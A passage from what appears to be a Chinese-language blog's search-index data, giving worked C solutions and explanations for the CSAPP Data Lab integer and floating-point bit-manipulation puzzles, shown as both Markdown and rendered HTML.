x+(pow(2,n)-1)>>n : x>>n `\n\n### negate\n\n```c\n/* \n * negate - return -x \n *   Example: negate(1) = -1.\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 5\n *   Rating: 2\n */\nint negate(int x) {\n\treturn ~x+1;\n}\n```\n\n#### 思路\n\n- 直接取反再加1\n\n### isPositive\n\n```c\n/* \n * isPositive - return 1 if x > 0, return 0 otherwise \n *   Example: isPositive(-1) = 0.\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 8\n *   Rating: 3\n */\nint isPositive(int x) {\n\treturn ~(x>>31)&!!x;\n}\n```\n\n#### 思路\n\n- 符号位判断，并且非0\n\n### isLessOrEqual\n\n```c\n/* \n * isLessOrEqual - if x <= y  then return 1, else return 0 \n *   Example: isLessOrEqual(4,5) = 1.\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 24\n *   Rating: 3\n */\nint isLessOrEqual(int x, int y) {\n\treturn !!(x>>31&~(y>>31)) | !(~(x>>31)&(y>>31))&(x+~y+1>>31) | !(x^y);\n\t//equal to  !!(x>>31&~(y>>31)) | !(~(x>>31)&(y>>31))&(x-y>>31) | !(x^y)\n}\n```\n\n#### 思路\n\n- `x<0&&y>0 | !(x>0&&y<0)&&(x-y>0) | x==y`\n\n### ilog2\n\n```c\n/*\n * ilog2 - return floor(log base 2 of x), where x > 0\n *   Example: ilog2(16) = 4\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 90\n *   Rating: 4\n */\nint ilog2(int x) {\n\tint mark1 = 0x55;\n\tint mark2 = 0x33;\n\tint mark3 = 0x0F;\n\tmark1 |= mark1<<8;\n\tmark1 |= mark1<<16;\n\tmark2 |= mark2<<8;\n\tmark2 |= mark2<<16;\n\tmark3 |= mark3<<8;\n\tmark3 |= mark3<<16;\n\n\tx |= x>>1;\n\tx |= x>>2;\n\tx |= x>>4;\n\tx |= x>>8;\n\tx |= x>>16;\n\tx >>= 1;\n\n\tx = (x>>1&mark1)+(x&mark1);\t//every two bits; clear record;\n\tx = (x>>2&mark2)+(x&mark2);\t//every four bits; clear record;\n\tx = (x>>4&mark3)+(x&mark3);\t//every eight bits; clear record;\n\tx = (x>>8)+x;\t//every 16 bits; record in the low 8 bits;\n\tx = (x>>16)+x;\t//every 32 bits; record in the low 8 bits;\n\treturn x&0xFF;\n}\n```\n\n#### 思路\n\n- 先构造从最高的1到最低位均为1的二进制，然后类似bitCount\n\n### float_neg\n\n```c\n/* \n * float_neg - Return bit-level equivalent of expression -f for\n *   floating point argument f.\n *   Both the argument and result are passed as unsigned int's, but\n *   they are to be interpreted as the bit-level representations of\n *   single-precision floating point values.\n *   When argument is NaN, return argument.\n *   Legal ops: Any integer/unsigned operations incl. ||, &&. also if, while\n *   Max ops: 10\n *   Rating: 2\n */\nunsigned float_neg(unsigned uf) {\n\tunsigned t = uf&0x7FFFFFFF;\n\tif(t^0x7F800000 && (t>>23)+1>>8)\n\t\treturn uf;\n\telse \n\t\treturn uf^0x80000000;\n}\n```\n\n#### 思路\n\n- 判别是否是NaN。先判断尾数是否全0，然后用`(t>>23)+1>>8`判断exp是否全1\n\n### float_i2f\n\n```c\n/* \n * float_i2f - Return bit-level equivalent of expression (float) x\n *   Result is returned as unsigned int, but\n *   it is to be interpreted as the bit-level representation of a\n *   single-precision floating point values.\n *   Legal ops: Any integer/unsigned operations incl. ||, &&. also if, while\n *   Max ops: 30\n *   Rating: 4\n */\nunsigned float_i2f(int x) {\n    unsigned shiftLeft=0;\n    unsigned afterShift, tmp, flag;\n    unsigned absX=x;\n    unsigned sign=0;\n    //special case\n    if (x==0) return 0;\n    //if x < 0, sign = 1000...,abs_x = -x\n    if (x<0)\n    {\n        sign=0x80000000;\n        absX=-x;\n    }\n    afterShift=absX;\n    //count shift_left and after_shift\n    while (1)\n    {\n        tmp=afterShift;\n        afterShift<<=1;\n        shiftLeft++;\n        if (tmp & 0x80000000) break;\n    }\n    if ((afterShift & 0x01ff)>0x0100)\n        flag=1;\n    else if ((afterShift & 0x03ff)==0x0300)\n        flag=1;\n    else\n        flag=0;\n \n    return sign + (afterShift>>9) + ((159-shiftLeft)<<23) + flag;\n}\n//from http://www.cnblogs.com/tenlee/p/4951639.html\n```\n\n#### 思路\n\n- 分情况处理0、负数、正数\n\n- 要处理舍人\n\n  > - 向接近的舍入\n  > - 如果处于中间，向偶数舍入\n\n- 舍入时，如果尾数加一，exp有可能需要进位，这时候直接加一效果一样，可以导致exp进位，不需要特殊处理。如果exp等于0xFE，那么进位就变成了inf，也是合法的\n\n### float_twict\n\n```c\n/* \n * float_twice - Return bit-level equivalent of expression 2*f for\n *   floating point argument f.\n *   Both the argument and result are passed as unsigned int's, but\n *   they are to be interpreted as the bit-level representation of\n *   single-precision floating point values.\n *   When argument is NaN, return argument\n *   Legal ops: Any integer/unsigned operations incl. ||, &&. also if, while\n *   Max ops: 30\n *   Rating: 4\n */\nunsigned float_twice(unsigned uf) {\n\tunsigned t = uf&0x7FFFFFFF;\n\tunsigned temp = t&0x7F800000;\n\tunsigned temp2 = uf&0xFF800000;\n\tint expFull = !(temp^0x7F800000);\n\tif(t^0x7F800000 && expFull)\n\t\treturn uf;\n\tif(expFull){\n\t\treturn temp2;\n\t}\n\tif(!(t&0x7F800000)){\n\t\tunsigned k = (uf&0x7FFFFF);\n\t\treturn temp2+(k<<1);\n\t}\n\treturn (temp>>23)+1<<23 | uf&0x807FFFFF;\n}\n```\n\n#### 思路\n\n- 分情况处理三种IEEE754的情况\n- 需要注意exp全0时，乘以二就是尾数乘以二，如果发生进位需要exp进位，不需要特殊处理（第三个if），因为进位直接导致exp加一，这就足够了\n\n","content":"<h1 id=\"CSAPP-data-Lab\"><a href=\"#CSAPP-data-Lab\" class=\"headerlink\" title=\"CSAPP data Lab\"></a>CSAPP data Lab</h1><blockquote>\n<p>注意，本文代码出于节省括号避免繁杂的考虑，对运算符优先级利用得比较充分，比如 1&gt;&gt;n+1 等价于 1&gt;&gt;(n+1)，所以代码里写了1&gt;&gt;n+1。</p>\n</blockquote>\n<h3 id=\"bitAnd\"><a href=\"#bitAnd\" class=\"headerlink\" title=\"bitAnd\"></a>bitAnd</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * bitAnd - x&amp;y using only ~ and | </span></span><br><span class=\"line\"><span class=\"comment\"> *   Example: bitAnd(6, 5) = 4</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ~ |</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 8</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 1</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">bitAnd</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ~(~x|~y);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>德摩根定律</li>\n</ul>\n<h3 id=\"getByte\"><a href=\"#getByte\" class=\"headerlink\" title=\"getByte\"></a>getByte</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * getByte - Extract byte n from word x</span></span><br><span class=\"line\"><span class=\"comment\"> *   Bytes numbered from 0 (LSB) to 3 (MSB)</span></span><br><span class=\"line\"><span class=\"comment\"> *   Examples: getByte(0x12345678,1) = 0x56</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 6</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 2</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">getByte</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> bias = n&lt;&lt;<span class=\"number\">3</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (x&gt;&gt;bias)&amp;<span class=\"number\">0xFF</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-1\"><a href=\"#思路-1\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>移位到最低的1byte然后用0xFF提取</li>\n</ul>\n<h3 id=\"logicalShift\"><a href=\"#logicalShift\" class=\"headerlink\" title=\"logicalShift\"></a>logicalShift</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * logicalShift - shift x to the right by n, using a logical shift</span></span><br><span class=\"line\"><span class=\"comment\">\ti</span></span><br><span class=\"line\"><span class=\"comment\"> *   Can assume that 0 &lt;= n &lt;= 31</span></span><br><span class=\"line\"><span class=\"comment\"> *   Examples: logicalShift(0x87654321,4) = 0x08765432</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 20</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 3 </span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">logicalShift</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (<span class=\"number\">1</span>&lt;&lt;<span class=\"number\">32</span>+~n&lt;&lt;<span class=\"number\">1</span>)+~<span class=\"number\">0</span> &amp; (x&gt;&gt;n);</span><br><span class=\"line\">  <span class=\"comment\">//equal to ((1&lt;&lt;31-n&lt;&lt;1)-1)&amp;(x&gt;&gt;n);</span></span><br><span class=\"line\">  <span class=\"comment\">//负号优先级高于移位</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-2\"><a href=\"#思路-2\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li><p>因为不能用<code>-</code>，所以用取反加一代替取负</p>\n</li>\n<li><p>构造低<code>32-n</code>bit的1来提取移位后的数值</p>\n</li>\n<li><p>因为移位量不能小于0或大于等于32，所以对于n可能是0而导致移位量是32的情况，先移位31位，再移位1位</p>\n<blockquote>\n<p>小技巧，如果n移位k，k$\\in$[0, 32]，则可以<code>n&gt;&gt;(k-!!k)&gt;&gt;!!k</code></p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"bitCount\"><a href=\"#bitCount\" class=\"headerlink\" title=\"bitCount\"></a>bitCount</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * bitCount - returns count of number of 1's in word</span></span><br><span class=\"line\"><span class=\"comment\"> *   Examples: bitCount(5) = 2, bitCount(7) = 3</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 40</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 4</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">bitCount</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> mark1 = <span class=\"number\">0x55</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> mark2 = <span class=\"number\">0x33</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> mark3 = <span class=\"number\">0x0F</span>;</span><br><span class=\"line\">\tmark1 |= mark1&lt;&lt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tmark1 |= mark1&lt;&lt;<span class=\"number\">16</span>;</span><br><span class=\"line\">\tmark2 |= mark2&lt;&lt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tmark2 |= mark2&lt;&lt;<span class=\"number\">16</span>;</span><br><span class=\"line\">\tmark3 |= mark3&lt;&lt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tmark3 |= mark3&lt;&lt;<span class=\"number\">16</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">1</span>&amp;mark1)+(x&amp;mark1);\t<span class=\"comment\">//every two bits; clear record;</span></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">2</span>&amp;mark2)+(x&amp;mark2);\t<span class=\"comment\">//every four bits; clear record;</span></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">4</span>&amp;mark3)+(x&amp;mark3);\t<span class=\"comment\">//every eight bits; clear record;</span></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">8</span>)+x;\t<span class=\"comment\">//every 16 bits; record in the low 8 bits;</span></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">16</span>)+x;\t<span class=\"comment\">//every 32 bits; record in the low 8 bits;</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x&amp;<span class=\"number\">0xFF</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-3\"><a href=\"#思路-3\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>构造0x55555555，提取每两位中的low bit。通过移位及0x55555555，提取每两位中的高位。然后相加，使得结果中，每两位的二进制值就是该两位的bit数目</li>\n<li>同样的思路，提取每四位的low bit、high bit，然后相加</li>\n<li>因为32==100000(二级制)，也就是只需要5位就可以记录有多少bit数，所以不需要每次都构造常数屏蔽高位的值，直接移位相加然后取低8bit就可以得到最终结果</li>\n</ul>\n<h3 id=\"bang\"><a href=\"#bang\" class=\"headerlink\" title=\"bang\"></a>bang</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * bang - Compute !x without using !</span></span><br><span class=\"line\"><span class=\"comment\"> *   Examples: bang(3) = 0, bang(0) = 1</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 12</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 4 </span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">bang</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">1</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">2</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">4</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">16</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ~x&amp;<span class=\"number\">0x1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-4\"><a href=\"#思路-4\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>如果非0，位模式从最高位的1到最低位都填充为1，</li>\n<li>如果为0，则位模式还是保持全0</li>\n</ul>\n<h3 id=\"tmin\"><a href=\"#tmin\" class=\"headerlink\" title=\"tmin\"></a>tmin</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * tmin - return minimum two's complement integer </span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 4</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 1</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">tmin</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>&lt;&lt;<span class=\"number\">31</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"fitBits\"><a href=\"#fitBits\" class=\"headerlink\" title=\"fitBits\"></a>fitBits</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * fitsBits - return 1 if x can be represented as an </span></span><br><span class=\"line\"><span class=\"comment\"> *  n-bit, two's complement integer.</span></span><br><span class=\"line\"><span class=\"comment\"> *   1 &lt;= n &lt;= 32</span></span><br><span class=\"line\"><span class=\"comment\"> *   Examples: fitsBits(5,3) = 0, fitsBits(-4,3) = 1</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 15</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 2</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">fitsBits</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> !(x&gt;&gt;n+~<span class=\"number\">0</span>)|!((x&gt;&gt;n+~<span class=\"number\">0</span>)+<span class=\"number\">1</span>);</span><br><span class=\"line\">  <span class=\"comment\">//equal to !(x&gt;&gt;n-1) | !((x&gt;&gt;n-1)+1)</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-5\"><a href=\"#思路-5\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>算术移n-1位，如果是负数，且可以用n bits的补码表示，则得到-1。如果是正数，则得到0。</li>\n</ul>\n<h3 id=\"divpwr2\"><a href=\"#divpwr2\" class=\"headerlink\" title=\"divpwr2\"></a>divpwr2</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * divpwr2 - Compute x/(2^n), for 0 &lt;= n &lt;= 30</span></span><br><span class=\"line\"><span class=\"comment\"> *  Round toward zero</span></span><br><span class=\"line\"><span class=\"comment\"> *   Examples: divpwr2(15,1) = 7, divpwr2(-33,4) = -2</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 15</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 2</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">divpwr2</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = x&gt;&gt;<span class=\"number\">31</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (x+(t&amp;<span class=\"number\">1</span>&lt;&lt;n)+(~(t&amp;<span class=\"number\">1</span>)+<span class=\"number\">1</span>))&gt;&gt;n;</span><br><span class=\"line\">  <span class=\"comment\">//equal to (x+(t&amp;1&lt;&lt;n)-(t&amp;1))&gt;&gt;n;</span></span><br><span class=\"line\">  <span class=\"comment\">//note that &amp; 的优先级低于&lt;&lt;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-6\"><a href=\"#思路-6\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>直接移位是round down，无论是负数还是正数</li>\n<li>所以要实现round to zero , C表达式为<code>x&lt;0 ? x+(pow(2,n)-1)&gt;&gt;n : x&gt;&gt;n</code></li>\n</ul>\n<h3 id=\"negate\"><a href=\"#negate\" class=\"headerlink\" title=\"negate\"></a>negate</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * negate - return -x </span></span><br><span class=\"line\"><span class=\"comment\"> *   Example: negate(1) = -1.</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 5</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 2</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">negate</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ~x+<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-7\"><a href=\"#思路-7\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>直接取反再加1</li>\n</ul>\n<h3 id=\"isPositive\"><a href=\"#isPositive\" class=\"headerlink\" title=\"isPositive\"></a>isPositive</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * isPositive - return 1 if x &gt; 0, return 0 otherwise </span></span><br><span class=\"line\"><span class=\"comment\"> *   Example: isPositive(-1) = 0.</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 8</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 3</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">isPositive</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ~(x&gt;&gt;<span class=\"number\">31</span>)&amp;!!x;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-8\"><a href=\"#思路-8\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>符号位判断，并且非0</li>\n</ul>\n<h3 id=\"isLessOrEqual\"><a href=\"#isLessOrEqual\" class=\"headerlink\" title=\"isLessOrEqual\"></a>isLessOrEqual</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class=\"line\"><span class=\"comment\"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 24</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 3</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">isLessOrEqual</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> !!(x&gt;&gt;<span class=\"number\">31</span>&amp;~(y&gt;&gt;<span class=\"number\">31</span>)) | !(~(x&gt;&gt;<span class=\"number\">31</span>)&amp;(y&gt;&gt;<span class=\"number\">31</span>))&amp;(x+~y+<span class=\"number\">1</span>&gt;&gt;<span class=\"number\">31</span>) | !(x^y);</span><br><span class=\"line\">\t<span class=\"comment\">//equal to  !!(x&gt;&gt;31&amp;~(y&gt;&gt;31)) | !(~(x&gt;&gt;31)&amp;(y&gt;&gt;31))&amp;(x-y&gt;&gt;31) | !(x^y)</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-9\"><a href=\"#思路-9\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li><code>x&lt;0&amp;&amp;y&gt;0 | !(x&gt;0&amp;&amp;y&lt;0)&amp;&amp;(x-y&gt;0) | x==y</code></li>\n</ul>\n<h3 id=\"ilog2\"><a href=\"#ilog2\" class=\"headerlink\" title=\"ilog2\"></a>ilog2</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 